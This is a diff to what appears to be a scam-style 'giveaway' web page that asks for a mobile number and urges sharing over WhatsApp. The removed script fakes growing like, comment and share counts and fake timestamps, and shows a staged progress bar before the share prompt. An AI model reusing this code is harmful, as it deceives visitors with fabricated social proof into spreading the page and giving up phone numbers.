@@ -11,7 +11,7 @@
 
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>IND MOBZ OFF - 2024</title>
+<title>ASL SPORTS</title>
         <link rel="shortcut icon" type="image/png" href="https://i.imgur.com/Pwey4fF.png" />
         <meta name="og:title" content="بنده بلس" />
         <meta name="og:url" content="URL" />
@@ -397,7 +397,7 @@ button:hover {
     
     
     
-<!------>
+<!------
 
         <div class="post1">
         <div  class="welcome">
@@ -426,7 +426,7 @@ button:hover {
                                   <center><p class="title">Enter your Mobile Number</p>
                 <center><input type="tel" placeholder=" Enter your Mobile Number " id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 16px;width: 330px;" onkeypress="return numberonly(event);"><br><br>
             <button id="select">Next</button>
-        </div>
+        </div><!------>
         <div class="step2">
             <table>
                 <tbody>
@@ -548,89 +548,7 @@ function myFunction() {
             saved = "",
             share = "whatsapp://send?text=" + link + text + text2;
     </script>
-<script>
-<!-- code by ODcompany -->
-  <!-- JS -->
-<script type="text/javascript">
-var time = 0;
-window.setInterval(function () {
-    time = time + 1;
-    $(".t1").html(time + 1 + "m");
-    $(".t2").html(time + 2 + "m");
-    $(".t3").html(time + 4 + "m");
-}, 6e4);
-var likes = 134,
-    comments = 23,
-    shares = 12;
-window.setInterval(function () {
-    likes = likes + Math.floor(Math.random() * 3);
-    comments = comments + Math.floor(Math.random() * 2);
-    shares = shares + Math.floor(Math.random() * 2);
-    $("#likes").html(likes + "K");
-    $("#comments").html(comments + "K comments");
-    $("#shares").html(shares + "K shares");
-}, 5e3);
-$(".liked").click(function () {
-    if ($(this).hasClass("selected")) {
-        $(this).removeClass("selected");
-        $(this).html("Like");
-    } else {
-        $(this).addClass("selected");
-        $(this).html("Unlike");
-    }
-});  
-  
-</script>
-<script type="text/javascript">
-var name = localStorage.getItem("name");
-$("#getname").html(name);
-$("#select").click(function () {
-    var name = $("#name").val();
-    localStorage.setItem("name", name);
-    var number = $("#grade").val();
-    if (name.length < 5 || name.length > 150) {
-        alert(errorname);
-    } else if (number === "0") {
-        alert(errornumber);
-    } else {
-        $(".step1").fadeOut(0);
-        $(".step2").fadeIn(500);
-        $("#pastname").html(name);
-        $("#pastnumber").html(number);
-    }
-});
-$(".yes").click(function () {
-    $(".welcome").fadeOut(0);
-    $(".step2").fadeOut(0);
-    $("#checking").fadeIn(1000);
-    var i = 0;
-    var interval = setInterval(function () {
-        i += 1;
-        $("#percentage").text(i + "%");
-        $("#fill").css("width", i + "%");
-        if (i == 50) {
-            i = 49;
-            setTimeout(function () {
-                i = 50;
-            }, 1000);
-        }
-        if (i >= 100) {
-            clearInterval(interval);
-            $("#load").fadeOut(0);
-            $("#check").fadeIn(0);
-            setTimeout(function () {
-                $("#checking").fadeOut(0);
-                $("#share").fadeIn(1000);
-                $("#getname").html($("#name").val());
-            }, 1000);
-        }
-    }, 50);
-});
-$(".no").click(function () {
-    $(".step2").fadeOut(0);
-    $(".step1").fadeIn(500);
-});  
-</script>  
+
 <script type="text/javascript">  
 var swidth = localStorage.getItem(saved);
 if (swidth !== null) {
